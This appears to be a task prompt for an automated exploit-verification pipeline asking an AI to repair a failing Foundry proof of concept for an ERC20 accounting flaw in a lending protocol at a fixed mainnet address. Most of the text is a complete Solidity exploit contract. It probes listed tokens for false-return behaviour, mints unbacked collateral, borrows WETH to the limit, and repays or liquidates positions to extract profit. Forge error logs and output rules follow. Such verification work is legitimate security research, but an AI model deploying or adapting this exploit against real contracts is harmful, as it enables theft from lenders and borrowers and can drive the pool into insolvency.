You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Transfer-in accounting trusts nominal amounts and ignores unsuccessful ERC20 return values
- claim: Deposits, solely-deposits, paybacks, and liquidation payback legs update pool and position accounting from the caller-supplied `_amount` before the token transfer settles, while `_callOptionalReturn()` only reverts on low-level call failure and silently accepts ERC20s that return `false`. Fee-on-transfer, deflationary, false-return, or otherwise non-standard listed tokens can therefore mint too many lending shares or cancel too many borrow shares relative to the tokens the protocol actually receives.
- impact: If such a token is listed, an attacker can overmint claims on a pool, repay debt at a discount, or execute underfunded liquidations, pushing the shortfall onto lenders and other borrowers and potentially stealing pool value or causing insolvency.
- exploit_paths: ["depositExactAmount -> _handleDeposit -> _safeTransferFrom", "solelyDeposit -> _handleSolelyDeposit -> _safeTransferFrom", "paybackExactAmount/paybackExactShares -> _handlePayback -> _safeTransferFrom", "liquidatePartiallyFromTokens/coreLiquidationIsolationPools -> _coreLiquidation -> _corePayback -> _safeTransferFrom"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.23;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IPositionNFTLike {
    function mintPosition() external returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IWiseSecurityLike {
    function overallETHBorrowHeartbeat(uint256 nftId) external view returns (uint256);
    function getLiveDebtRatio(uint256 nftId) external view returns (uint256);
}

interface IWiseLendingLike {
    function WETH_ADDRESS() external view returns (address);
    function POSITION_NFT() external view returns (address);
    function WISE_SECURITY() external view returns (address);

    function depositExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function solelyDeposit(uint256 nftId, address poolToken, uint256 amount) external;
    function borrowExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function paybackExactAmount(uint256 nftId, address poolToken, uint256 amount) external returns (uint256);
    function paybackExactShares(uint256 nftId, address poolToken, uint256 shares) external returns (uint256);
    function liquidatePartiallyFromTokens(
        uint256 nftId,
        uint256 nftIdLiquidator,
        address paybackToken,
        address receiveToken,
        uint256 shareAmountToPay
    ) external returns (uint256);

    function getTotalPool(address poolToken) external view returns (uint256);
    function getPositionLendingShares(uint256 nftId, address poolToken) external view returns (uint256);
    function getPositionBorrowShares(uint256 nftId, address poolToken) external view returns (uint256);
    function getPositionLendingTokenByIndex(uint256 nftId, uint256 index) external view returns (address);
    function getPositionLendingTokenLength(uint256 nftId) external view returns (uint256);

    function cashoutAmount(address poolToken, uint256 shares) external view returns (uint256);
    function paybackAmount(address poolToken, uint256 shares) external view returns (uint256);

    function borrowPoolData(address poolToken)
        external
        view
        returns (bool allowBorrow, uint256 pseudoTotalBorrowAmount, uint256 totalBorrowShares, uint256 borrowRate);
}

contract TokenVault {
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function sweep(address token, address to) external {
        require(msg.sender == owner, "only owner");
        uint256 amount = IERC20Like(token).balanceOf(address(this));
        if (amount == 0) {
            return;
        }
        _safeTransfer(token, to, amount);
    }

    function _safeTransfer(address token, address to, uint256 amount) private {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "vault transfer");
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x37e49bf3749513A02FA535F0CbC383796E8107E4;

    IWiseLendingLike internal immutable WISE;
    IWiseSecurityLike internal immutable SECURITY;
    IPositionNFTLike internal immutable POSITION_NFT;
    TokenVault internal immutable VAULT;
    address internal immutable WETH;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public executed;
    address public vulnerableToken;
    uint256 public depositPathNft;
    uint256 public solelyPathNft;
    uint256 public liquidatorNft;

    modifier onlySelf() {
        require(msg.sender == address(this), "only self");
        _;
    }

    constructor() {
        WISE = IWiseLendingLike(TARGET);
        WETH = WISE.WETH_ADDRESS();
        SECURITY = IWiseSecurityLike(WISE.WISE_SECURITY());
        POSITION_NFT = IPositionNFTLike(WISE.POSITION_NFT());
        VAULT = new TokenVault();
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        address[] memory candidates = _candidateTokens();

        // Direct-or-existing-balance-first:
        // 1. Probe the false-return branch directly with zero-balance/zero-real-funds calls.
        // 2. If a listed token silently returns false instead of reverting, the deposit and solely-deposit
        //    paths mint collateral for free and the payback / liquidation paths can also be exercised.
        // 3. If no token behaves that way at this fork state, the fee-on-transfer branch would require the
        //    verifier to already hold a listed deflationary token; no balance is injected here.
        vulnerableToken = _findFalseReturnListedToken(candidates);
        if (vulnerableToken == address(0)) {
            return;
        }

        _attemptDepositPath(vulnerableToken);
        _attemptSolelyDepositPath(vulnerableToken);
        _attemptPaybackPath(vulnerableToken);
        _attemptLiquidationPath(vulnerableToken);
    }

    function _findFalseReturnListedToken(address[] memory candidates) internal returns (address) {
        uint256 length = candidates.length;
        for (uint256 i = 0; i < length; ++i) {
            address token = candidates[i];
            if (token == address(0)) {
                continue;
            }

            _forceApprove(token, TARGET, type(uint256).max);

            uint256 probeNft = POSITION_NFT.mintPosition();
            uint256 amount = _probeAmount(token);

            if (_tryDepositWithEscalation(probeNft, token, amount)) {
                if (WISE.getPositionLendingShares(probeNft, token) > 0) {
                    return token;
                }
            }

            uint256 solelyProbeNft = POSITION_NFT.mintPosition();
            if (_trySolelyDeposit(solelyProbeNft, token, amount)) {
                if (_pureProbeSucceeded(solelyProbeNft, token)) {
                    return token;
                }
            }
        }

        return address(0);
    }

    function _pureProbeSucceeded(uint256 nftId, address token) internal view returns (bool) {
        try WISE.getPositionLendingTokenLength(nftId) returns (uint256 len) {
            if (len == 0) {
                return false;
            }
        } catch {
            return false;
        }
        // Solely deposits do not create shares, so the existence of the token entry is the useful signal.
        try WISE.getPositionLendingTokenByIndex(nftId, 0) returns (address storedToken) {
            return storedToken == token;
        } catch {
            return false;
        }
    }

    function _attemptDepositPath(address token) internal {
        depositPathNft = POSITION_NFT.mintPosition();
        uint256 startWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 amount = _probeAmount(token);

        if (!_tryDepositWithEscalation(depositPathNft, token, amount)) {
            return;
        }

        uint256 mintedShares = WISE.getPositionLendingShares(depositPathNft, token);
        if (mintedShares == 0) {
            return;
        }

        _borrowMaxWeth(depositPathNft, startWeth);
    }

    function _attemptSolelyDepositPath(address token) internal {
        solelyPathNft = POSITION_NFT.mintPosition();
        uint256 startWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 amount = _probeAmount(token);

        if (!_trySolelyDeposit(solelyPathNft, token, amount)) {
            return;
        }

        if (!_pureProbeSucceeded(solelyPathNft, token)) {
            return;
        }

        _borrowMaxWeth(solelyPathNft, startWeth);
    }

    function _attemptPaybackPath(address token) internal {
        uint256 collateralNft = depositPathNft;
        if (collateralNft == 0) {
            collateralNft = solelyPathNft;
        }
        if (collateralNft == 0) {
            return;
        }

        (bool allowBorrow,,,) = _borrowPoolDataSafe(token);
        if (!allowBorrow) {
            return;
        }

        uint256 poolLiquidity = _totalPoolSafe(token);
        if (poolLiquidity == 0) {
            return;
        }

        uint256 borrowAmount = _min(_probeAmount(token), poolLiquidity / 10);
        if (borrowAmount == 0) {
            return;
        }

        uint256 startToken = IERC20Like(token).balanceOf(address(this));

        if (!_tryBorrow(collateralNft, token, borrowAmount)) {
            return;
        }

        uint256 borrowedNow = IERC20Like(token).balanceOf(address(this)) - startToken;
        if (borrowedNow == 0) {
            return;
        }

        _safeTransfer(token, address(VAULT), borrowedNow);
        _forceApprove(token, TARGET, type(uint256).max);

        if (_tryPaybackExactAmount(collateralNft, token, borrowedNow)) {
            if (WISE.getPositionBorrowShares(collateralNft, token) == 0) {
                VAULT.sweep(token, address(this));
                _updateProfit(token, startToken);
                return;
            }
        }

        // Retry the same vulnerable stage through the exact-shares entry if the amount-based entry did not clear.
        uint256 sharesOutstanding = WISE.getPositionBorrowShares(collateralNft, token);
        if (sharesOutstanding == 0) {
            return;
        }

        if (_tryPaybackExactShares(collateralNft, token, sharesOutstanding)) {
            if (WISE.getPositionBorrowShares(collateralNft, token) == 0) {
                VAULT.sweep(token, address(this));
                _updateProfit(token, startToken);
            }
        }
    }

    function _attemptLiquidationPath(address token) internal {
        uint256 supply = 0;
        try POSITION_NFT.totalSupply() returns (uint256 total) {
            supply = total;
        } catch {
            return;
        }

        if (supply == 0) {
            return;
        }

        liquidatorNft = POSITION_NFT.mintPosition();

        uint256 startIndex = supply;
        uint256 endExclusive = supply > 512 ? supply - 512 : 0;

        for (uint256 nftId = startIndex; nftId > endExclusive; --nftId) {
            uint256 debtRatio;
            try SECURITY.getLiveDebtRatio(nftId) returns (uint256 ratio) {
                debtRatio = ratio;
            } catch {
                continue;
            }

            if (debtRatio <= 1e18) {
                continue;
            }

            uint256 borrowShares = WISE.getPositionBorrowShares(nftId, token);
            if (borrowShares == 0) {
                continue;
            }

            address receiveToken;
            try WISE.getPositionLendingTokenLength(nftId) returns (uint256 len) {
                if (len == 0) {
                    continue;
                }
                receiveToken = WISE.getPositionLendingTokenByIndex(nftId, 0);
            } catch {
                continue;
            }

            uint256 shareSlice = borrowShares / 10;
            if (shareSlice == 0) {
                shareSlice = borrowShares;
            }

            uint256 startBalance = IERC20Like(receiveToken).balanceOf(address(this));

            if (_tryLiquidate(nftId, liquidatorNft, token, receiveToken, shareSlice)) {
                uint256 gained = IERC20Like(receiveToken).balanceOf(address(this)) - startBalance;
                if (gained > 0) {
                    _updateProfit(receiveToken, startBalance);
                    return;
                }
            }
        }
    }

    function _borrowMaxWeth(uint256 nftId, uint256 startWeth) internal {
        uint256 poolLiquidity = _totalPoolSafe(WETH);
        if (poolLiquidity == 0) {
            return;
        }

        uint256 borrowHeadroom;
        try SECURITY.overallETHBorrowHeartbeat(nftId) returns (uint256 buffer) {
            borrowHeadroom = buffer;
        } catch {
            return;
        }

        if (borrowHeadroom == 0) {
            return;
        }

        uint256 attempt = _min(poolLiquidity * 99 / 100, borrowHeadroom * 99 / 100);
        if (attempt == 0) {
            return;
        }

        for (uint256 i = 0; i < 18; ++i) {
            if (_tryBorrow(nftId, WETH, attempt)) {
                break;
            }
            attempt /= 2;
            if (attempt == 0) {
                break;
            }
        }

        _updateProfit(WETH, startWeth);
    }

    function _tryDepositWithEscalation(uint256 nftId, address token, uint256 amount) internal returns (bool) {
        if (_tryDeposit(nftId, token, amount)) {
            return true;
        }

        uint256 next = amount * 10;
        if (next > amount && _tryDeposit(nftId, token, next)) {
            return true;
        }

        next = next * 10;
        if (next > amount && _tryDeposit(nftId, token, next)) {
            return true;
        }

        return false;
    }

    function _probeAmount(address token) internal view returns (uint256) {
        uint8 dec = 18;
        try IERC20Like(token).decimals() returns (uint8 fetched) {
            dec = fetched > 18 ? 18 : fetched;
        } catch {}

        return 10 ** uint256(dec);
    }

    function _candidateTokens() internal view returns (address[] memory list) {
        list = new address[](24);
        list[0] = WETH;
        list[1] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC
        list[2] = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // USDT
        list[3] = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI
        list[4] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; // WBTC
        list[5] = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84; // stETH
        list[6] = 0x7f39C581F595B53c5cb5bB9b2A7e0a0f3F1f8fA3; // wstETH
        list[7] = 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704; // cbETH
        list[8] = 0xae78736Cd615f374D3085123A210448E74Fc6393; // rETH
        list[9] = 0x5E8422345238F34275888049021821E8E08CAa1f; // frxETH
        list[10] = 0xac3E018457B222d93114458476f3E3416Abbe38F; // sfrxETH
        list[11] = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0; // LUSD
        list[12] = 0x99D8a9C45b2eCb0cCa4E46A6f4dB1B29eFf6aee5; // MIM
        list[13] = 0xF939E0A03Fb07F59A73314E73794Be0E57Ac1b4E; // crvUSD
        list[14] = 0x9f8F72aA9304c8B593d555F12ef6589cC3A579A2; // MKR
        list[15] = 0x514910771AF9Ca656af840dff83E8264EcF986CA; // LINK
        list[16] = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DdAe9; // AAVE
        list[17] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984; // UNI
        list[18] = 0xD533a949740bb3306d119CC777fa900bA034cd52; // CRV
        list[19] = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B; // CVX
        list[20] = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F; // SNX
        list[21] = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51; // sUSD
        list[22] = 0xB8c77482e45F1F44De1745F52C74426C631bDD52; // BNB
        list[23] = 0xc00e94Cb662C3520282E6f5717214004A7f26888; // COMP
    }

    function _updateProfit(address token, uint256 startBalance) internal {
        uint256 current = IERC20Like(token).balanceOf(address(this));
        if (current <= startBalance) {
            return;
        }

        uint256 delta = current - startBalance;
        if (_profitAmount == 0 || token == WETH || delta > _profitAmount) {
            _profitToken = token;
            _profitAmount = delta;
        }
    }

    function _totalPoolSafe(address token) internal view returns (uint256) {
        try WISE.getTotalPool(token) returns (uint256 totalPool) {
            return totalPool;
        } catch {
            return 0;
        }
    }

    function _borrowPoolDataSafe(address token)
        internal
        view
        returns (bool allowBorrow, uint256 pseudoTotalBorrowAmount, uint256 totalBorrowShares, uint256 borrowRate)
    {
        try WISE.borrowPoolData(token) returns (
            bool _allowBorrow,
            uint256 _pseudoTotalBorrowAmount,
            uint256 _totalBorrowShares,
            uint256 _borrowRate
        ) {
            return (_allowBorrow, _pseudoTotalBorrowAmount, _totalBorrowShares, _borrowRate);
        } catch {
            return (false, 0, 0, 0);
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "transfer");
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function callDeposit(uint256 nftId, address token, uint256 amount) external onlySelf returns (uint256) {
        return WISE.depositExactAmount(nftId, token, amount);
    }

    function callSolelyDeposit(uint256 nftId, address token, uint256 amount) external onlySelf {
        WISE.solelyDeposit(nftId, token, amount);
    }

    function callBorrow(uint256 nftId, address token, uint256 amount) external onlySelf returns (uint256) {
        return WISE.borrowExactAmount(nftId, token, amount);
    }

    function callPaybackAmount(uint256 nftId, address token, uint256 amount) external onlySelf returns (uint256) {
        return WISE.paybackExactAmount(nftId, token, amount);
    }

    function callPaybackShares(uint256 nftId, address token, uint256 shares) external onlySelf returns (uint256) {
        return WISE.paybackExactShares(nftId, token, shares);
    }

    function callLiquidate(
        uint256 victimNft,
        uint256 liquidatorPosition,
        address paybackToken,
        address receiveToken,
        uint256 shareAmount
    ) external onlySelf returns (uint256) {
        return WISE.liquidatePartiallyFromTokens(
            victimNft,
            liquidatorPosition,
            paybackToken,
            receiveToken,
            shareAmount
        );
    }

    function _tryDeposit(uint256 nftId, address token, uint256 amount) internal returns (bool) {
        try this.callDeposit(nftId, token, amount) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _trySolelyDeposit(uint256 nftId, address token, uint256 amount) internal returns (bool) {
        try this.callSolelyDeposit(nftId, token, amount) {
            return true;
        } catch {
            return false;
        }
    }

    function _tryBorrow(uint256 nftId, address token, uint256 amount) internal returns (bool) {
        try this.callBorrow(nftId, token, amount) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _tryPaybackExactAmount(uint256 nftId, address token, uint256 amount) internal returns (bool) {
        try this.callPaybackAmount(nftId, token, amount) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _tryPaybackExactShares(uint256 nftId, address token, uint256 shares) internal returns (bool) {
        try this.callPaybackShares(nftId, token, shares) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _tryLiquidate(
        uint256 victimNft,
        uint256 liquidatorPosition,
        address paybackToken,
        address receiveToken,
        uint256 shareAmount
    ) internal returns (bool) {
        _forceApprove(paybackToken, TARGET, type(uint256).max);
        try this.callLiquidate(victimNft, liquidatorPosition, paybackToken, receiveToken, shareAmount) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
Error: Encountered invalid solc version in src/FlawVerifier.sol: No solc version installed that matches the version requirement: =0.8.23
Encountered invalid solc version in src/FlawVerifier.sol: No solc version installed that matches the version requirement: =0.8.23

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
